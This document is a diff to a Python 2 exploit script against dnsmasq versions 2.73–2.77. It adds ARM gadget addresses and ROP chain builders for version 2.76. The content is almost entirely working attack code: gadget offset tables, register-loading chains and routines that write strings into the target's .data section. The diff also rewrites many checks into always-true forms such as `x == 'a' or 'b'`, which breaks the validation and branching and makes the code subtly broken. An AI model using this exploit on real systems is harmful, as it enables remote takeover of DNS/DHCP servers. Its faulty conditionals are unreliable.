@@ -102,7 +102,8 @@ TEXT = {
         "2.76": 0x0000000000402d30
     },
     "arm": {
-        "2.77": 0x00012088
+        "2.77": 0x00012088,
+        "2.76": 0x00011ff8
     }
 }
 
@@ -121,7 +122,8 @@ DATA = {
         "2.76": 0x0000000000648460
     },
     "arm": {
-        "2.77": 0x0005e238
+        "2.77": 0x0005e238,
+        "2.76": 0x0005d22c
     }
 }
 
@@ -140,7 +142,8 @@ EXECL = {
         "2.76": 0x0000000000426a36
     },
     "arm": {
-        "2.77": 0x00035254
+        "2.77": 0x00035254,
+        "2.76": 0x00034284
     }
 }
 
@@ -215,7 +218,17 @@ ROP = {
             "ldr r0": 0x00043d80,  # ldr r0, [r3, #0x90] ; pop {r4, pc}
             "ldr r2": 0x00039168,  # ldr r2, [r5] ; ldr r3, [r4, #4] ; cmp r2, r3 ; beq #0x39194 ; mov r0, #0 ; pop {r4, r5, r6, pc}
             "str": 0x0003478c      # str r3, [r4] ; pop {r4, pc}
-         }
+         },
+        "2.76": {
+            "pop r1": 0x000450e8,  # pop {r1, pc}
+            "pop r3": 0x0001198c,  # pop {r3, pc}
+            "pop r4": 0x00015810,  # pop {r4, pc}
+            "pop r5": 0x0001c74c,  # pop {r4, r5, pc}
+            "pop r6": 0x0001212c,  # pop {r4, r5, r6, pc}
+            "ldr r0": 0x00042adc,  # ldr r0, [r3, #0x90] ; pop {r4, pc}
+            "ldr r2": 0x00038088,  # ldr r2, [r5] ; ldr r3, [r4, #4] ; cmp r2, r3 ; beq #0x39194 ; mov r0, #0 ; pop {r4, r5, r6, pc}
+            "str": 0x00033974      # str r3, [r4] ; pop {r4, pc}
+        }
     }
 }
 
@@ -294,18 +307,14 @@ host = str(args.target)
 port = int(args.target_port)
 
 architecture = ""
-if args.architecture == "i386" or args.architecture == "amd64" or args.architecture == "arm":
+if args.architecture == "i386" or "amd64" or "arm":
     architecture = args.architecture
 else:
     print Base.c_error + "Bad architecture: " + args.architecture + ". Allow only arm, i386 or amd64!"
     exit(1)
 
 dnsmasq_version = ""
-if args.version == "2.73" or \
-                args.version == "2.74" or \
-                args.version == "2.75" or \
-                args.version == "2.76" or \
-                args.version == "2.77":
+if args.version == "2.73" or "2.74" or "2.75" or "2.76" or "2.77":
     dnsmasq_version = args.version
 else:
     print Base.c_error + "Bad dnsmasq version: " + args.version + " allow only 2.73, 2.74, 2.75, 2.76 or 2.77!"
@@ -470,7 +479,7 @@ def add_string_in_data(addr_in_data, string):
     v = dnsmasq_version
     rop_chain = ""
 
-    if architecture == "i386" or architecture == "arm":
+    if architecture == "i386" or "arm":
         if len(string) % 4 == 0:
             string = string + "\x00" * 4
         else:
@@ -484,7 +493,7 @@ def add_string_in_data(addr_in_data, string):
 
     if architecture == "i386":
 
-        if dnsmasq_version == "2.77" or dnsmasq_version == "2.76":
+        if dnsmasq_version == "2.77" or "2.76":
             for x in range(0, len(string), 4):
                 rop_chain += Base.pack32(ROP[a][v]["pop all"])  # pop eax ; pop ebx ; pop esi ; ret
                 rop_chain += Base.pack32(addr_in_data + x)      # address in .data
@@ -494,7 +503,7 @@ def add_string_in_data(addr_in_data, string):
                 rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in ebx
                 rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in esi
 
-        if dnsmasq_version == "2.75" or dnsmasq_version == "2.74" or dnsmasq_version == "2.73":
+        if dnsmasq_version == "2.75" or "2.74" or "2.73":
             for x in range(0, len(string), 4):
                 rop_chain += Base.pack32(ROP[a][v]["pop eax"])  # pop eax ; ret
                 rop_chain += Base.pack32(addr_in_data + x)      # address in .data
@@ -506,7 +515,7 @@ def add_string_in_data(addr_in_data, string):
 
     if architecture == "amd64":
 
-        if v == "2.77" or v == "2.76":
+        if v == "2.77" or "2.76":
             for x in range(0, len(string), 8):
                 rop_chain += Base.pack64(ROP[a][v]["pop rsi"])     # pop rsi ; ret
                 rop_chain += Base.pack64(addr_in_data + x - 0x70)  # address in .data - 0x70
@@ -516,7 +525,7 @@ def add_string_in_data(addr_in_data, string):
 
     if architecture == "arm":
 
-        if dnsmasq_version == "2.77":
+        if dnsmasq_version == "2.77" or "2.76":
             for x in range(0, len(string), 4):
                 rop_chain += Base.pack32(ROP[a][v]["pop r3"])  # pop {r3, pc}
                 rop_chain += string[x:x + 4]                   # r3 = 4 byte of string
@@ -536,7 +545,7 @@ def register_management(architecture, dnsmasq_version, register_name, register_v
 
     if architecture == "amd64":
         if r == "r8d":
-            if v == "2.77" or v == "2.76":
+            if v == "2.77" or "2.76":
                 # RAX = 0x219ec2
                 # pop rax; ret
                 result += register_management(architecture, dnsmasq_version, "rax", CMP_EAX[dnsmasq_version])
@@ -556,15 +565,15 @@ def register_management(architecture, dnsmasq_version, register_name, register_v
                 result += Base.pack64(CRASH[architecture])  # RBP = 0x4141414141414141
                 result += Base.pack64(CRASH[architecture])  # R12 = 0x4141414141414141
 
-        if r == "rax" or r == "rbp" or r == "rbx" or r == "rdx" or r == "rdi" or r == "rsi":
-            if v == "2.77" or v == "2.76":
+        if r == "rax" or "rbp" or "rbx" or "rdx" or "rdi" or "rsi":
+            if v == "2.77" or "2.76":
                 # <register_name> = register_value
                 # pop <register_name>; ret
                 result += Base.pack64(ROP[architecture][dnsmasq_version]["pop " + register_name])
                 result += Base.pack64(register_value)
 
         if r == "ecx":
-            if v == "2.77" or v == "2.76":
+            if v == "2.77" or "2.76":
                 # RDI = register_value
                 # pop rdi; ret
                 result += register_management(architecture, dnsmasq_version, "rdi", register_value)
@@ -581,7 +590,7 @@ def register_management(architecture, dnsmasq_version, register_name, register_v
 
     elif architecture == "arm":
         if r == "r0":
-            if v == "2.77":
+            if v == "2.77" or "2.76":
                 result += register_management(architecture, dnsmasq_version, "r3", register_value)
                 result += register_management(architecture, dnsmasq_version, "r4", register_address)
                 result += Base.pack32(ROP[architecture][dnsmasq_version]["str"])
@@ -592,8 +601,15 @@ def register_management(architecture, dnsmasq_version, register_name, register_v
                 result += Base.pack32(ROP[architecture][dnsmasq_version]["ldr r0"])
                 result += Base.pack32(NOP[architecture])    # r4 = 0x90909090
 
+        if r == "r1":
+            if v == "2.77" or "2.76":
+                # r1 = register_value
+                # pop {r1, pc}
+                result += Base.pack32(ROP[architecture][dnsmasq_version]["pop r1"])
+                result += Base.pack32(register_value)
+
         if r == "r2":
-            if v == "2.77":
+            if v == "2.77" or "2.76":
                 result += register_management(architecture, dnsmasq_version, "r3", register_value)
                 result += register_management(architecture, dnsmasq_version, "r4", register_address)
                 result += Base.pack32(ROP[architecture][dnsmasq_version]["str"])
@@ -608,22 +624,29 @@ def register_management(architecture, dnsmasq_version, register_name, register_v
                 result += Base.pack32(NOP[architecture])    # r5 = 0x90909090
                 result += Base.pack32(NOP[architecture])    # r6 = 0x90909090
 
-        if r == "r1" or r == "r3" or r == "r4":
-            if v == "2.77":
-                # <register_name> = register_value
-                # pop {<register_name>, pc}
-                result += Base.pack32(ROP[architecture][dnsmasq_version]["pop " + register_name])
+        if r == "r3":
+            if v == "2.77" or "2.76":
+                # r3 = register_value
+                # pop {r3, pc}
+                result += Base.pack32(ROP[architecture][dnsmasq_version]["pop r3"])
+                result += Base.pack32(register_value)
+
+        if r == "r4":
+            if v == "2.77" or "2.76":
+                # r4 = register_value
+                # pop {r4, pc}
+                result += Base.pack32(ROP[architecture][dnsmasq_version]["pop r4"])
                 result += Base.pack32(register_value)
 
         if r == "r5":
-            if v == "2.77":
+            if v == "2.77" or "2.76":
                 # pop {r4, r5, pc}
                 result += Base.pack32(ROP[architecture][dnsmasq_version]["pop r5"])
                 result += Base.pack32(register_address)   # r4 = <register_address>
                 result += Base.pack32(register_value)     # r5 = <register_value>
 
         if r == "r6":
-            if v == "2.77":
+            if v == "2.77" or "2.76":
                 # # pop {r4, r5, r6, pc}
                 result += Base.pack32(ROP[architecture][dnsmasq_version]["pop r6"])
                 result += Base.pack32(register_address)   # r4 = <register_address>
